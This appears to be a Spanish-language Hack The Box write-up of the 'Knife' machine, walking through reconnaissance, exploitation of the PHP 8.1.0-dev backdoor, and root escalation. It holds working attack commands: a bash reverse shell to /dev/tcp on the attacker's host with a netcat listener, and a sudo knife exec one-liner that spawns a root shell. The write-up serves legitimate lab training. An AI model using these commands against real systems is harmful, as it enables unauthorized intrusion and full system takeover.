---
title: Knife
parent: Easy
nav_order: 1
---

# Walkthrough — Knife (Hack The Box)
{: .fs-9 }

> Una experiencia técnica entretenida y desafiante en la máquina Knife de HTB. En este walkthrough te muestro cómo logré acceso como root, aprovechando una backdoor en PHP y una curiosa configuración de privilegios. 🎯
{: .fs-6 .fw-300 }

---

## 🔰 Introducción

**Knife** es una máquina de dificultad *Easy*, ideal para practicar reconocimiento web y escalada de privilegios.  
¿Lo mejor? ¡Una puerta trasera en PHP nos da la bienvenida! 🕵️‍♂️

- SO: Linux  
- Dificultad: Easy  
- Herramientas: `nmap`, `ffuf`, `netcat`, `python`

---

## 🔍 Escaneo de puertos con Nmap

Como siempre, empiezo con una mirada rápida a todos los puertos disponibles:

```bash
nmap -sC -sV -p- -T4 10.10.10.242
```

> Escaneo completo + detección de servicios. ¡Vamos con todo!

![Resultado de Nmap](/assets/images/knife/01-nmap.png)

---

## 🧠 Primer vistazo: servicios interesantes

Nmap nos revela dos servicios abiertos:

- `22/tcp` → SSH  
- `80/tcp` → HTTP corriendo **PHP 8.1.0-dev** 👀

PHP en versión dev... eso huele a peligro (para ellos). 😏

---

## 🚪 Buscando rutas ocultas con ffuf

Fuzzear es clave para encontrar puertas escondidas. Usé:

```bash
ffuf -u http://10.10.10.242/FUZZ -w Discovery/Web-Content/common.txt -mc 200,204,301,302,307,403 -fs 401 -t 40
```

![ffuf en acción](/assets/images/knife/02-ffuf.png)

¡Y encontramos `index.php`!

---

## 🔬 Revisando el tráfico con Burp

Una visita al `index.php` y capturamos la respuesta con Burp Suite:

![Burp inspección](/assets/images/knife/03-burp.png)

Respuesta 200 OK. Está activo y esperando... ☕️

---

## 💣 Explotación: PHP 8.1.0-dev con backdoor

¡Hora de atacar! Encontré un script en GitHub que aprovecha una **backdoor** en PHP 8.1.0-dev. Ideal.

```bash
python php-8.1.0-dev-rce.py -u http://10.10.10.242
```
![github](/assets/images/knife/05b-github.png)


![Ejecutando el exploit](/assets/images/knife/05-exploit-running.png)

---

## 🐚 Shell invertida a la vista

Desde esa shell lanzamos una reverse shell a nuestra máquina:

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.16/4444 0>&1"
```

Y por acá la recibimos con netcat:

```bash
nc -lvnp 4444
```

![Reverse Shell iniciada](/assets/images/knife/07b-nc-listening.png)

![Ejecutando el reversr](/assets/images/knife/05c-exploit-running.png)

---

## 🧍‍♂️ Flag de usuario

Ya como `james`, leemos nuestra primera recompensa:

```bash
whoami
cat user.txt
```

![User flag](/assets/images/knife/08-user-flag.png)

---

## 🧨 Escalada de privilegios con knife

Revisamos los permisos sudo:

```bash
sudo -l
```

¡Sorpresa! Podemos ejecutar `/usr/bin/knife` como root sin contraseña. 😮

![Sudo Knife](/assets/images/knife/09-sudo-knife.png)

Ejecutamos bash desde knife:

```bash
sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
```

¡Boom! Ahora somos root. 👑

![Root shell](/assets/images/knife/10-root-shell.png)

---

## 🏁 Flag de root

Terminamos con broche de oro:

```bash
cd /root
cat root.txt
```

![Flag root](/assets/images/knife/11-root-flag.png)

---

## 🎉 Resumen final

| Etapa           | Resultado                         |
|-----------------|-----------------------------------|
| Enumeración     | PHP 8.1.0-dev encontrado          |
| Explotación     | Backdoor → acceso a `james`       |
| Escalada        | Abuso de `/usr/bin/knife`         |
| Flags obtenidas | `user.txt` y `root.txt` ✔️        |

---

¡Y así completamos la máquina Knife con éxito! 🔪  

**Autor:** [gueco99](https://github.com/gueco99)  
🧠 Hack the Box – *Knife* (Easy)
